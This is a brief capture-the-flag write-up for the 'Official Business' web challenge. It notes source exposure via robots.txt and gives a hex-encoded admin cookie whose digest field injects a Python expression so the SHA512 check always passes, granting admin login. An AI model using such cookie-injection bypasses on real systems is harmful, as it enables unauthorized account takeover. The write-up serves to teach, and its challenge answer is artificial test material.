# Official Business
Going to `/robots.txt` reveals the server source code, along with some authentication checks.

We didn't really do this the intended way.

Set the auth cookie to
```
auth=7b2275736572223a202261646d696e222c202270617373776f7264223a202270617373222c202261646d696e223a20747275652c2022646967657374223a2022686173686c69622e736861353132287365637265745f6b6579202b206279746573286a736f6e2e64756d707328636f6f6b69652c20736f72745f6b6579733d54727565292c205c2261736369695c2229292e6865786469676573742829227d
```

which is the encoded form of
```
{'user': 'admin', 'password': 'pass', 'admin': True, 'digest': 'hashlib.sha512(secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")).hexdigest()'}
```

This makes the SHA512 comparison always true, allowing you to log in as the admin.